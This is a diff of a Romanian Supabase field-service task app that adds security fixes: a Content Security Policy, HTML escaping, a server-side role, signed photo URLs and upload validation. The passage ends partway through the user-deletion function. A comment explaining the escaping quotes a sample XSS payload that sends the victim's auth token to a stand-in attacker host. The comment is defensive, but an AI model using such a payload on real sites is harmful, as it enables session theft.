@@ -3,6 +3,21 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<!-- ═══ Content Security Policy — măsură complementară anti-XSS ═══
+     Nu înlocuiește escaping-ul (vezi funcția esc()), dar limitează mult ce
+     poate face un payload injectat: blochează exfiltrarea către domenii
+     necunoscute și încărcarea de scripturi din surse neautorizate. -->
+<meta http-equiv="Content-Security-Policy" content="
+  default-src 'self';
+  script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://www.gstatic.com;
+  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+  font-src 'self' https://fonts.gstatic.com;
+  img-src 'self' data: blob: https://*.supabase.co;
+  connect-src 'self' https://*.supabase.co wss://*.supabase.co https://fcm.googleapis.com https://www.googleapis.com https://firebaseinstallations.googleapis.com https://fcmregistrations.googleapis.com;
+  frame-ancestors 'none';
+  base-uri 'self';
+  form-action 'self';
+">
 <title>QuickTech Security</title>
 <link rel="manifest" href="/manifest.json">
 <link rel="icon" type="image/png" sizes="192x192" href="/icon-192.png">
@@ -16,7 +31,12 @@
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<!-- Versiune fixată + SRI: dacă CDN-ul livrează alt conținut decât cel
+     verificat, browserul refuză să-l execute. Cu tag-ul mobil @2, orice
+     update (sau compromitere a CDN-ului) ar fi rulat necontrolat. -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.0/dist/umd/supabase.js"
+        integrity="sha256-5EXC6EebrEekSGfr8oQlDG0TctyFsueRDD83biaSHFQ="
+        crossorigin="anonymous"></script>
 <style>
 /* ─────────────────────────────────────────────────────
    QuickTech Tasks — Design System (Plus Jakarta Sans)
@@ -2627,12 +2647,8 @@ label {
     <div class="fg"><label>Nume complet</label><input type="text" id="regName" placeholder="Ion Popescu"></div>
     <div class="fg"><label>Email</label><input type="email" id="regEmail" placeholder="ion@quicktech.ro"></div>
     <div class="fg"><label>Parolă</label><input type="password" id="regPass" placeholder="min. 6 caractere"></div>
-    <div class="fg">
-      <label>Rol</label>
-      <select id="regRole">
-        <option value="technician">Tehnician</option>
-        <option value="admin">Administrator</option>
-      </select>
+    <div style="background:#EFF6FF;border:1px solid #BFDBFE;border-radius:8px;padding:10px 12px;font-size:12px;color:#1E40AF;margin-bottom:12px;">
+      ℹ️ Conturile noi se creează cu rol <strong>Tehnician</strong>. Pentru drepturi de administrator, contactează un admin existent.
     </div>
     <button class="btn btn-primary btn-full" onclick="doRegister()">Creează cont</button>
     <div style="text-align:center;margin-top:12px;font-size:13px;color:var(--text-muted);">
@@ -3015,12 +3031,22 @@ async function doRegister() {
   const name = document.getElementById('regName').value.trim();
   const email = document.getElementById('regEmail').value.trim();
   const pass = document.getElementById('regPass').value;
-  const role = document.getElementById('regRole').value;
+  // SECURITATE: rolul NU se mai preia de la client. Orice cont creat public
+  // primește obligatoriu 'technician'. Promovarea la admin se face doar de
+  // un admin existent, din panoul Utilizatori (și e blocată suplimentar prin RLS).
   if (!name||!email||!pass) { showErr('regErr','Completează toate câmpurile.'); return; }
-  const { data, error } = await sb.auth.signUp({ email, password: pass });
+  if (pass.length < 8) { showErr('regErr','Parola trebuie să aibă minim 8 caractere.'); return; }
+
+  // Profilul se creează automat de trigger-ul `handle_new_user` din Postgres,
+  // cu rol forțat 'technician'. Numele ajunge acolo prin user_metadata.
+  // Insertul manual de aici a fost eliminat: se lovea de cheia primară
+  // creată de trigger și putea arunca eroare la înregistrare.
+  const { error } = await sb.auth.signUp({
+    email,
+    password: pass,
+    options: { data: { full_name: name } }
+  });
   if (error) { showErr('regErr', error.message); return; }
-  // insert profile
-  await sb.from('profiles').insert({ id: data.user.id, full_name: name, role });
   showToast('Cont creat! Te poți conecta acum.','success');
   showLogin();
 }
@@ -3116,6 +3142,8 @@ async function showApp() {
   await loadTasks();
   await loadNotifications();
   subscribeRealtime();
+  // Dacă app-ul a fost lansat dintr-o notificare (?task=ID), deschide taskul
+  checkTaskFromUrl();
   // Inițializează FCM după ce userul e logat
   setTimeout(() => initFCM(), 1000);
   // Încarcă garanțiile și verifică urgențele
@@ -3249,6 +3277,20 @@ async function loadTasks() {
       const detailContent = document.getElementById('detailContent');
       if (detailEmpty) detailEmpty.style.display = 'flex';
       if (detailContent) detailContent.style.display = 'none';
+    }
+  } else if (window.innerWidth > 900) {
+    // Auto-selectare primul task la încărcare (doar pe desktop — pe mobil
+    // panoul de detalii e ecran separat, ar acoperi lista inutil).
+    // Respectă filtrul curent: ia primul task din lista efectiv afișată.
+    const firstCard = document.querySelector('#taskList .task-card[data-task-id]');
+    if (firstCard) {
+      const firstId = Number(firstCard.dataset.taskId);
+      const firstTask = allTasks.find(t => t.id === firstId);
+      if (firstTask) {
+        selectedTaskId = firstId;
+        firstCard.classList.add('selected');
+        renderTaskDetail(firstTask);
+      }
     }
   }
 }
@@ -3387,7 +3429,7 @@ function renderTasks() {
       <div class="tc-ico" style="background:${ico.bg};">${ico.icon}</div>
       <div class="tc-body">
         <div class="tc-top">
-          <div class="tc-client">${t.client}</div>
+          <div class="tc-client">${esc(t.client)}</div>
         </div>
         <div class="tc-loc">${locDisplay ? (locDisplay + ' · ') : ''}${techName}</div>
       </div>
@@ -3406,6 +3448,55 @@ function renderTasks() {
     } else {
       closeTaskDetail();
     }
+  }
+}
+
+// ═══ Deschidere task din notificare push ═══
+// Funcționează în două scenarii:
+//  1. App deschis  → service worker trimite postMessage NOTIFICATION_CLICK
+//  2. App închis   → se lansează pe URL-ul /?task=ID
+async function openTaskFromNotification(taskId) {
+  const id = Number(taskId);
+  if (!id) return;
+  // Asigură-te că suntem pe ecranul de taskuri
+  if (typeof showTasks === 'function') showTasks();
+  // Dacă taskul nu e în lista curentă (ex: e din altă lună), reîncarcă
+  let t = allTasks.find(x => x.id === id);
+  if (!t) {
+    await loadTasks();
+    t = allTasks.find(x => x.id === id);
+  }
+  if (t) {
+    selectTask(id);
+    // Scroll la cardul respectiv
+    setTimeout(() => {
+      const card = document.querySelector(`.task-card[data-task-id="${id}"]`);
+      if (card) card.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    }, 200);
+  } else {
+    showToast('Taskul nu a fost găsit (poate fi din altă lună).', 'info');
+  }
+}
+
+// Ascultă click-urile pe notificări când aplicația e deja deschisă
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.addEventListener('message', event => {
+    if (event.data?.type === 'NOTIFICATION_CLICK') {
+      const tid = event.data.data?.task_id;
+      if (tid) openTaskFromNotification(tid);
+    }
+  });
+}
+
+// La pornire: dacă URL-ul conține ?task=ID (app lansat din notificare
+// când era închis), deschide direct taskul respectiv.
+function checkTaskFromUrl() {
+  const params = new URLSearchParams(window.location.search);
+  const taskParam = params.get('task');
+  if (taskParam) {
+    // Curăț URL-ul ca să nu redeschidă taskul la refresh
+    window.history.replaceState({}, '', window.location.pathname);
+    setTimeout(() => openTaskFromNotification(taskParam), 600);
   }
 }
 
@@ -3465,7 +3556,7 @@ function renderTaskDetail(t) {
     const avatarsHtml = members.slice(0, 5).map((m, idx) => {
       const initials = m.full_name.split(' ').map(w=>w[0]).join('').toUpperCase().slice(0,2);
       const isMe = m.id === currentUser?.id;
-      return `<div class="team-avatar ${isMe ? 'me' : ''}" style="background:${avatarColor(m.full_name)};margin-left:${idx === 0 ? '0' : '-8px'};z-index:${10-idx};" title="${m.full_name}${isMe ? ' (tu)' : ''}">${initials}</div>`;
+      return `<div class="team-avatar ${isMe ? 'me' : ''}" style="background:${avatarColor(m.full_name)};margin-left:${idx === 0 ? '0' : '-8px'};z-index:${10-idx};" title="${esc(m.full_name)}${isMe ? ' (tu)' : ''}">${initials}</div>`;
     }).join('');
     const extraCount = members.length > 5 ? `<div class="team-avatar more">+${members.length - 5}</div>` : '';
     const namesText = members.map(m => m.full_name.split(' ')[0] + (m.id === currentUser?.id ? ' (tu)' : '')).join(', ');
@@ -3516,7 +3607,7 @@ function renderTaskDetail(t) {
 
   scroll.innerHTML = `
     <div class="det-hdr">
-      <div class="det-title">${t.client||'—'}</div>
+      <div class="det-title">${esc(t.client)||'—'}</div>
       <div class="det-meta">
         ${priorityBadge(t.priority)}
         ${statusBadge(t.status)}
@@ -3539,20 +3630,20 @@ function renderTaskDetail(t) {
       ${t.phone ? `
         <div class="info-block">
           <div class="info-block-lbl">Telefon client</div>
-          <a class="info-block-val phone" href="tel:${t.phone}">📞 ${t.phone}</a>
+          <a class="info-block-val phone" href="tel:${encodeURIComponent(t.phone)}">📞 ${esc(t.phone)}</a>
         </div>
       ` : ''}
       ${t.description ? `
         <div class="info-block">
           <div class="info-block-lbl">Descriere</div>
-          <div class="info-block-val desc">${t.description}</div>
+          <div class="info-block-val desc">${esc(t.description)}</div>
         </div>
       ` : ''}
       ${assigneeBlock}
       ${t.mentions ? `
         <div class="info-block">
           <div class="info-block-lbl">Mențiuni</div>
-          <div class="info-block-mentions">${t.mentions}</div>
+          <div class="info-block-mentions">${esc(t.mentions)}</div>
         </div>
       ` : ''}
       <div class="info-block" id="detailPhotosBlock">
@@ -3848,7 +3939,8 @@ async function saveTask() {
         await sb.from('notifications').insert(notifs);
         await sendPushToUsers(techIds,
           '🔒 QuickTech Security',
-          `🌐 Task disponibil: ${payload.client} — preia primul!`
+          `🌐 Task disponibil: ${payload.client} — preia primul!`,
+          data?.id
         );
       }
     } else if (isTeam && teamMemberIds && teamMemberIds.length) {
@@ -3861,7 +3953,8 @@ async function saveTask() {
       await sb.from('notifications').insert(notifs);
       await sendPushToUsers(teamMemberIds,
         '🔒 QuickTech Security',
-        `👥 Task echipă: ${payload.client} — ${priorityLabel(payload.priority)}`
+        `👥 Task echipă: ${payload.client} — ${priorityLabel(payload.priority)}`,
+        data?.id
       );
     } else if (techId) {
       await sb.from('notifications').insert({
@@ -3872,7 +3965,8 @@ async function saveTask() {
       // Push notification
       await sendPushToUsers([techId],
         '🔒 QuickTech Security',
-        `Task nou: ${payload.client} — ${priorityLabel(payload.priority)}`
+        `Task nou: ${payload.client} — ${priorityLabel(payload.priority)}`,
+        data?.id
       );
     }
     showToast('Task adăugat!','success');
@@ -3934,7 +4028,8 @@ async function updateStatus(taskId, newStatus) {
     const adminIds = admins.map(a => a.id);
     await sendPushToUsers(adminIds,
       '🔒 QuickTech Security',
-      `${currentProfile?.full_name} a ${statusLabels[newStatus]}${claimMsg} taskul: ${task.client}`
+      `${currentProfile?.full_name} a ${statusLabels[newStatus]}${claimMsg} taskul: ${task.client}`,
+      taskId
     );
   }
   showToast(isOpenPoolClaim ? 'Task preluat cu succes! 🎯' : 'Status actualizat!','success');
@@ -3977,7 +4072,8 @@ async function closeTeamTask(taskId) {
     await sb.from('notifications').insert(notifs);
     await sendPushToUsers(recipientIds,
       '🔒 QuickTech Security',
-      `✓ ${myName} a închis taskul echipă: ${task.client}`
+      `✓ ${myName} a închis taskul echipă: ${task.client}`,
+      taskId
     );
   }
 
@@ -4014,7 +4110,8 @@ async function reactivateTeamTask(taskId) {
     await sb.from('notifications').insert(notifs);
     await sendPushToUsers(task.team_member_ids,
       '🔒 QuickTech Security',
-      `↻ Taskul echipă reactivat: ${task.client}`
+      `↻ Taskul echipă reactivat: ${task.client}`,
+      taskId
     );
   }
 
@@ -4040,7 +4137,7 @@ function renderNotifications() {
   }
   list.innerHTML = notifications.map(n => `
     <div class="np-item ${n.read?'':'unread'}" onclick="markRead(${n.id})">
-      <div class="np-msg">${n.message}</div>
+      <div class="np-msg">${esc(n.message)}</div>
       <div class="np-time">${timeAgo(n.created_at)}</div>
     </div>
   `).join('');
@@ -4143,6 +4240,39 @@ function confirmModal(msg) {
   });
 }
 
+// ═══ SECURITATE: escaping HTML pentru toate valorile din DB ═══
+// Fără asta, un utilizator care salvează un nume de client de forma
+// <img src=x onerror="fetch('https://atacator.tld/?d='+localStorage.getItem('sb-...-auth-token'))">
+// execută cod în browserul oricui deschide lista — inclusiv al adminului,
+// exfiltrându-i sesiunea. Se aplică pe TOATE datele interpolate în HTML.
+function esc(v) {
+  if (v === null || v === undefined) return '';
+  return String(v)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
+}
+
+// ═══ EVENT DELEGATION ═══
+// Înlocuiește onclick="fn('${valoare_din_db}')". Interpolarea în atribute
+// onclick e fragilă: un apostrof într-un nume (O'Neill) rupe handler-ul,
+// iar un payload construit intenționat scapă din context și execută cod.
+// Cu data-* valoarea rămâne date, niciodată cod.
+document.addEventListener('click', e => {
+  const delUser = e.target.closest('.js-del-user');
+  if (delUser) {
+    deleteUser(delUser.dataset.id, delUser.dataset.name);
+    return;
+  }
+  const useLoc = e.target.closest('.js-use-loc');
+  if (useLoc) {
+    useLocation(useLoc.dataset.name, useLoc.dataset.address, useLoc.dataset.maps || '');
+    return;
+  }
+});
+
 function showToast(msg, type='info') {
   const t = document.getElementById('toast');
   t.textContent = msg; t.className = `toast ${type} show`;
@@ -4200,7 +4330,7 @@ async function saveMentions() {
     }));
     await sb.from('notifications').insert(notifRows);
     await sendPushToUsers(allRecipientIds, '💬 Mențiune nouă — QuickTech',
-      `${author}: ${newText.substring(0, 80)}${newText.length > 80 ? '...' : ''}`);
+      `${author}: ${newText.substring(0, 80)}${newText.length > 80 ? '...' : ''}`, taskId);
   }
 
   showToast('Mențiune salvată! ✅', 'success');
@@ -4218,12 +4348,32 @@ async function openPhotosModal(taskId) {
 }
 function closePhotosModal() { document.getElementById('photosOverlay').classList.remove('open'); }
 
+// ═══ SECURITATE: URL-uri semnate pentru bucket privat ═══
+// Bucket-ul `task-photos` e PRIVAT — pozele de la intervenții la clienți
+// nu mai sunt accesibile public doar cu link-ul. Fiecare afișare generează
+// un URL semnat, valabil 1 oră, legat de sesiunea utilizatorului.
+async function getSignedPhotoUrls(taskId, fileNames) {
+  if (!fileNames.length) return {};
+  const paths = fileNames.map(n => `task-${taskId}/${n}`);
+  const { data, error } = await sb.storage
+    .from('task-photos')
+    .createSignedUrls(paths, 3600); // 1 oră
+  if (error) { console.warn('[getSignedPhotoUrls]', error.message); return {}; }
+  const map = {};
+  (data || []).forEach((item, i) => {
+    if (item.signedUrl) map[fileNames[i]] = item.signedUrl;
+  });
+  return map;
+}
+
 async function loadPhotos(taskId, isClosed) {
   const grid = document.getElementById('photosGrid');
   const { data } = await sb.storage.from('task-photos').list(`task-${taskId}/`);
   const photos = (data || []).filter(f => f.name !== '.emptyFolderPlaceholder');
+  const urlMap = await getSignedPhotoUrls(taskId, photos.map(f => f.name));
   const photosHtml = photos.map(f => {
-    const url = sb.storage.from('task-photos').getPublicUrl(`task-${taskId}/${f.name}`).data.publicUrl;
+    const url = urlMap[f.name];
+    if (!url) return '';
     return `<img src="${url}" class="photo-thumb" onclick="openLightbox('${url}')">`;
   }).join('');
   // Butonul de upload (＋) apare doar dacă task-ul NU e închis
@@ -4234,20 +4384,118 @@ async function loadPhotos(taskId, isClosed) {
   }
 }
 
+// ═══ SECURITATE: validare fișiere înainte de upload ═══
+// Fără verificare, se putea urca orice — inclusiv fișiere HTML/SVG care,
+// servite dintr-un bucket public, execută cod în contextul domeniului.
+// Verificăm tipul MIME real, extensia și dimensiunea.
+const ALLOWED_IMAGE_TYPES = ['image/jpeg', 'image/png', 'image/webp', 'image/heic', 'image/heif'];
+const ALLOWED_EXTENSIONS = ['jpg', 'jpeg', 'png', 'webp', 'heic', 'heif'];
+// Limita de INTRARE. Compresia de mai jos aduce fișierul sub 10 MB
+// (limita reală de pe bucket). Fără marja asta, o poză de 12 MB ar fi
+// respinsă degeaba — după compresie ar avea sub 1 MB.
+const MAX_FILE_SIZE = 25 * 1024 * 1024; // 25 MB
+
+function validateImageFile(file) {
+  const ext = (file.name.split('.').pop() || '').toLowerCase().replace(/[^a-z0-9]/g, '');
+  if (!ALLOWED_EXTENSIONS.includes(ext)) {
+    return { ok: false, reason: `Extensie nepermisă (.${ext}). Acceptate: ${ALLOWED_EXTENSIONS.join(', ')}` };
+  }
+  if (!ALLOWED_IMAGE_TYPES.includes(file.type)) {
+    return { ok: false, reason: `Tip fișier nepermis (${file.type || 'necunoscut'}). Doar imagini.` };
+  }
+  if (file.size > MAX_FILE_SIZE) {
+    return { ok: false, reason: `Fișier prea mare (${(file.size / 1024 / 1024).toFixed(1)} MB). Maxim 10 MB.` };
+  }
+  if (file.size === 0) {
+    return { ok: false, reason: 'Fișier gol.' };
+  }
+  return { ok: true, ext };
+}
+
+// ═══ COMPRESIE IMAGINI ÎNAINTE DE UPLOAD ═══
+// Un telefon modern produce 4–8 MB per poză. La 15 poze pe task, echipa
+// din teren consumă ~100 MB de date pe o singură intervenție. Redimensionarea
+// la max 1920px + JPEG 0.82 reduce tipic cu 85–92%, fără pierdere utilă de
+// detaliu (un număr de serie rămâne perfect lizibil).
+const COMPRESS_MAX_DIM     = 1920;
+const COMPRESS_QUALITY     = 0.82;
+const COMPRESS_SKIP_UNDER  = 400 * 1024;  // sub 400 KB nu merită efortul
+
+async function compressImage(file) {
+  const origExt = (file.name.split('.').pop() || 'jpg').toLowerCase().replace(/[^a-z0-9]/g, '');
+
+  // Fișier deja mic → îl lăsăm neatins
+  if (file.size < COMPRESS_SKIP_UNDER) {
+    return { blob: file, ext: origExt, compressed: false, saved: 0 };
+  }
+
+  try {
+    // createImageBitmap respectă orientarea EXIF — altfel pozele făcute
+    // pe verticală ajung rotite după redesenarea pe canvas.
+    const bitmap = await createImageBitmap(file, { imageOrientation: 'from-image' });
+
+    const scale  = Math.min(1, COMPRESS_MAX_DIM / Math.max(bitmap.width, bitmap.height));
+    const width  = Math.round(bitmap.width  * scale);
+    const height = Math.round(bitmap.height * scale);
+
+    const canvas = document.createElement('canvas');
+    canvas.width  = width;
+    canvas.height = height;
+    const ctx = canvas.getContext('2d');
+    ctx.imageSmoothingQuality = 'high';
+    ctx.drawImage(bitmap, 0, 0, width, height);
+    bitmap.close();
+
+    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', COMPRESS_QUALITY));
+
+    // Dacă rezultatul nu e mai mic (rar, la PNG-uri simple), păstrăm originalul
+    if (!blob || blob.size >= file.size) {
+      return { blob: file, ext: origExt, compressed: false, saved: 0 };
+    }
+
+    return { blob, ext: 'jpg', compressed: true, saved: file.size - blob.size };
+
+  } catch (err) {
+    // HEIC pe Android/Chrome nu poate fi decodat de canvas.
+    // Nu blocăm uploadul — urcăm originalul.
+    console.warn('[compressImage] fallback la original:', err.message);
+    return { blob: file, ext: origExt, compressed: false, saved: 0 };
+  }
+}
+
 async function uploadPhotos() {
   const taskId = document.getElementById('photosTaskId').value;
   const files = document.getElementById('photoInput').files;
   const progress = document.getElementById('uploadProgress');
   progress.style.display = 'block';
+  let totalSaved = 0;   // octeți economisiți prin compresie
   for (const file of files) {
-    const name = `${Date.now()}_${file.name}`;
-    await sb.storage.from('task-photos').upload(`task-${taskId}/${name}`, file);
+    // Validare: tip, extensie, dimensiune
+    const check = validateImageFile(file);
+    if (!check.ok) {
+      showToast(`⚠️ ${file.name}: ${check.reason}`, 'error');
+      continue;
+    }
+    // Nume aleator, nu cel original — previne enumerarea fișierelor
+    // și problemele de interpolare în HTML (vezi P4/P7).
+    // Compresie: 1920px max, JPEG 0.82 (vezi compressImage)
+    const comp = await compressImage(file);
+    totalSaved += comp.saved;
+    const name = `${crypto.randomUUID()}.${comp.ext}`;
+    await sb.storage.from('task-photos').upload(`task-${taskId}/${name}`, comp.blob, {
+      contentType: comp.compressed ? 'image/jpeg' : file.type
+    });
   }
   progress.style.display = 'none';
   document.getElementById('photoInput').value = '';
   await loadPhotos(taskId);
   renderTaskDetail(allTasks.find(t => t.id === Number(taskId))); // refresh thumbnailuri din panou
-  showToast('Poze încărcate! ✅', 'success');
+  showToast(
+    totalSaved > 0
+      ? `Poze încărcate! ✅ (${(totalSaved / 1024 / 1024).toFixed(1)} MB economisiți)`
+      : 'Poze încărcate! ✅',
+    'success'
+  );
 }
 
 // ── Thumbnailuri poze în panoul de detalii (dreapta) ──
@@ -4261,10 +4509,12 @@ async function loadDetailPhotos(taskId, isClosed) {
     grid.innerHTML = `<div style="font-size:13px;color:var(--text-muted);padding:4px 0;">Nicio poză atașată.</div>`;
     return;
   }
+  const urlMap = await getSignedPhotoUrls(taskId, photos.map(f => f.name));
   grid.innerHTML = photos.map(f => {
-    const url = sb.storage.from('task-photos').getPublicUrl(`task-${taskId}/${f.name}`).data.publicUrl;
+    const url = urlMap[f.name];
+    if (!url) return '';
     const deleteBtn = isAdmin ? `
-      <button onclick="deleteDetailPhoto('${taskId}','${f.name}',this)" title="Șterge poza"
+      <button onclick="deleteDetailPhoto('${taskId}','${esc(f.name)}',this)" title="Șterge poza"
         style="position:absolute;top:2px;right:2px;background:rgba(220,38,38,0.85);color:#fff;border:none;border-radius:50%;width:20px;height:20px;cursor:pointer;font-size:12px;line-height:1;display:flex;align-items:center;justify-content:center;">✕</button>` : '';
     return `
       <div style="position:relative;display:inline-block;">
@@ -4280,8 +4530,20 @@ async function uploadDetailPhotos(taskId) {
   if (!files.length) return;
   showToast('Se încarcă pozele...', 'info');
   for (const file of files) {
-    const name = `${Date.now()}_${file.name}`;
-    const { error } = await sb.storage.from('task-photos').upload(`task-${taskId}/${name}`, file);
+    // Validare: tip, extensie, dimensiune
+    const check = validateImageFile(file);
+    if (!check.ok) {
+      showToast(`⚠️ ${file.name}: ${check.reason}`, 'error');
+      continue;
+    }
+    // Nume aleator, nu cel original — previne enumerarea fișierelor
+    // și problemele de interpolare în HTML (vezi P4/P7).
+    // Compresie: 1920px max, JPEG 0.82 (vezi compressImage)
+    const comp = await compressImage(file);
+    const name = `${crypto.randomUUID()}.${comp.ext}`;
+    const { error } = await sb.storage.from('task-photos').upload(`task-${taskId}/${name}`, comp.blob, {
+      contentType: comp.compressed ? 'image/jpeg' : file.type
+    });
     if (error) console.warn('Upload error:', error.message);
   }
   input.value = '';
@@ -4312,8 +4574,20 @@ async function uploadPendingTaskPhotos(taskId) {
   if (!pendingTaskPhotos || !pendingTaskPhotos.length) return;
   let okCount = 0;
   for (const file of pendingTaskPhotos) {
-    const name = `${Date.now()}_${file.name}`;
-    const { error } = await sb.storage.from('task-photos').upload(`task-${taskId}/${name}`, file);
+    // Validare: tip, extensie, dimensiune
+    const check = validateImageFile(file);
+    if (!check.ok) {
+      showToast(`⚠️ ${file.name}: ${check.reason}`, 'error');
+      continue;
+    }
+    // Nume aleator, nu cel original — previne enumerarea fișierelor
+    // și problemele de interpolare în HTML (vezi P4/P7).
+    // Compresie: 1920px max, JPEG 0.82 (vezi compressImage)
+    const comp = await compressImage(file);
+    const name = `${crypto.randomUUID()}.${comp.ext}`;
+    const { error } = await sb.storage.from('task-photos').upload(`task-${taskId}/${name}`, comp.blob, {
+      contentType: comp.compressed ? 'image/jpeg' : file.type
+    });
     if (error) console.warn('[uploadPendingTaskPhotos] eroare upload:', error.message);
     else okCount++;
   }
@@ -4342,26 +4616,56 @@ async function loadUsers() {
   list.innerHTML = data.map(u => `
     <div class="user-card">
       <div class="user-info">
-        <div class="avatar" style="background:${avatarColor(u.full_name)}">${u.full_name.split(' ').map(w=>w[0]).join('').toUpperCase().slice(0,2)}</div>
+        <div class="avatar" style="background:${avatarColor(u.full_name)}">${esc((u.full_name||'?').split(' ').map(w=>w[0]||'').join('').toUpperCase().slice(0,2))}</div>
         <div>
-          <div style="font-size:14px;font-weight:500;">${u.full_name}</div>
+          <div style="font-size:14px;font-weight:500;">${esc(u.full_name)}</div>
           <div style="font-size:12px;color:var(--text-muted);">${u.role === 'admin' ? '👑 Administrator' : '🔧 Tehnician'}</div>
         </div>
       </div>
-      ${u.id !== currentUser.id ? `<button class="btn btn-danger btn-sm" onclick="deleteUser('${u.id}','${u.full_name}')">✕</button>` : '<span style="font-size:11px;color:var(--text-muted);">Tu</span>'}
+      ${u.id !== currentUser.id ? `<button class="btn btn-danger btn-sm js-del-user" data-id="${esc(u.id)}" data-name="${esc(u.full_name)}">✕</button>` : '<span style="font-size:11px;color:var(--text-muted);">Tu</span>'}
     </div>
   `).join('');
 }
 
 async function addUser() {
+  // Verificare client-side (bariera reală rămâne RLS pe server — vezi P2)
+  if (currentProfile?.role !== 'admin') {
+    showToast('Doar administratorii pot crea utilizatori.', 'error');
+    return;
+  }
   const name = document.getElementById('newUserName').value.trim();
   const email = document.getElementById('newUserEmail').value.trim();
   const pass = document.getElementById('newUserPass').value;
   const role = document.getElementById('newUserRole').value;
   if (!name||!email||!pass) { showToast('Completează toate câmpurile!','info'); return; }
-  const { data, error } = await sb.auth.signUp({ email, password: pass });
-  if (error) { showToast('Eroare: '+error.message,'info'); return; }
-  await sb.from('profiles').insert({ id: data.user.id, full_name: name, role });
+  if (pass.length < 8) { showToast('Parola trebuie să aibă minim 8 caractere.','info'); return; }
+
+  // Creare prin edge function, nu signUp.
+  // signUp ar loga sesiunea curentă ca noul utilizator — adminul se
+  // trezea deconectat. auth.admin.createUser() (server-side) nu face asta.
+  // În plus, rolul se validează pe server, nu doar în interfață.
+  const { data: { session } } = await sb.auth.getSession();
+  if (!session?.access_token) { showToast('Sesiune expirată. Reconectează-te.','error'); return; }
+
+  showToast('Se creează contul...', 'info');
+  let res;
+  try {
+    const resp = await fetch(`${SUPABASE_URL}/functions/v1/manage-users`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${session.access_token}`,
+        'apikey': SUPABASE_KEY,
+      },
+      body: JSON.stringify({ action: 'create', email, password: pass, full_name: name, role }),
+    });
+    res = await resp.json();
+  } catch (err) {
+    showToast('Eroare de rețea: ' + err.message, 'error');
+    return;
+  }
+  if (!res?.ok) { showToast('Eroare: ' + (res?.error || 'necunoscută'), 'error'); return; }
+
   document.getElementById('newUserName').value='';
   document.getElementById('newUserEmail').value='';
   document.getElementById('newUserPass').value='';
@@ -4414,7 +4718,7 @@ function renderTeamsList() {
         <div class="user-info" style="flex:1;">
           <div class="avatar" style="background:linear-gradient(135deg,#1E5FD9,#3B82F6);">🛡️</div>
           <div style="flex:1;min-width:0;">
-            <div style="font-size:14px;font-weight:600;">${t.name}</div>
+            <div style="font-size:14px;font-weight:600;">${esc(t.name)}</div>
             <div style="font-size:11px;color:var(--text-muted);margin-top:2px;">${(t.member_ids || []).length} membri: ${memberNames}</div>
           </div>
         </div>
@@ -4439,7 +4743,7 @@ function renderTeamMembersChecklist(selectedIds = []) {
     <label style="display:flex;align-items:center;gap:8px;padding:6px 4px;cursor:pointer;border-radius:6px;" onmouseover="this.style.background='var(--surface2)'" onmouseout="this.style.background=''">
       <input type="checkbox" class="team-member-chk" value="${t.id}" ${selectedIds.includes(t.id) ? 'checked' : ''} style="width:16px;height:16px;cursor:pointer;">
       <div class="avatar" style="width:26px;height:26px;font-size:10px;background:${avatarColor(t.full_name)};">${t.full_name.split(' ').map(w=>w[0]).join('').toUpperCase().slice(0,2)}</div>
-      <span style="font-size:13px;">${t.full_name}</span>
+      <span style="font-size:13px;">${esc(t.full_name)}</span>
     </label>
   `).join('');
 }
@@ -4542,7 +4846,7 @@ function renderTaskTeamMembers(selectedIds = []) {
     <label style="display:flex;align-items:center;gap:8px;padding:6px 4px;cursor:pointer;border-radius:6px;" onmouseover="this.style.background='var(--surface2)'" onmouseout="this.style.background=''">
       <input type="checkbox" class="task-team-chk" value="${p.id}" ${selectedIds.includes(p.id) ? 'checked' : ''} style="width:16px;height:16px;cursor:pointer;">
       <div class="avatar" style="width:24px;height:24px;font-size:10px;background:${avatarColor(p.full_name)};">${p.full_name.split(' ').map(w=>w[0]).join('').toUpperCase().slice(0,2)}</div>
-      <span style="font-size:13px;">${p.full_name}</span>
+      <span style="font-size:13px;">${esc(p.full_name)}</span>
     </label>
   `).join('');
 }
@@ -4555,40 +4859,35 @@ function getSelectedTeamMemberIds() {
 
 
 async function deleteUser(id, name) {
-  if (!await confirmModal(`Ștergi tehnicianul ${name}?\n\nATENȚIE: se vor șterge și toate task-urile atribuite lui.`)) return;
+  if (!await confirmModal(`Ștergi tehnicianul ${name}?\n\nATENȚIE: se vor șterge contul, task-urile atribuite lui, cererile de materiale și de absență. Acțiunea e ireversibilă.`)) return;
 
+  // Ștergerea trece prin edge function: din client se putea șterge doar
+  // rândul din `profiles`, iar contul rămânea în auth.users — utilizatorul
+  // se mai putea loga, fără profil, iar aplicația se comporta imprevizibil.
+  const { data: { session } } = await sb.auth.getSession();
+  if (!session?.access_token) { showToast('Sesiune expirată. Reconectează-te.', 'error'); return; }
+
+  showToast('Se șterge contul...', 'info');
   try {
-    // 1. Șterg task-urile atribuite direct tehnicianului
-    const { error: tErr } = await sb.from('tasks').delete().eq('technician_id', id);
-    if (tErr) throw new Error('Ștergere task-uri: ' + tErr.message);
-
-    // 2. Îl scot din echipele unde e membru (team_member_ids), ca să nu rămână referințe
-    try {
-      const { data: teamTasks } = await sb.from('tasks').select('id, team_member_ids')
-        .contains('team_member_ids', [id]);
-      for (const tt of (teamTasks || [])) {
-        const cleaned = (tt.team_member_ids || []).filter(m => m !== id);
-        await sb.from('tasks').update({ team_member_ids: cleaned }).eq('id', tt.id);
-      }
-    } catch (teamErr) {
-      console.warn('[deleteUser] curățare echipe (ignorat):', teamErr.message);
-    }
-
-    // 3. Șterg profilul (cu .select() ca să știu câte rânduri s-au șters efectiv)
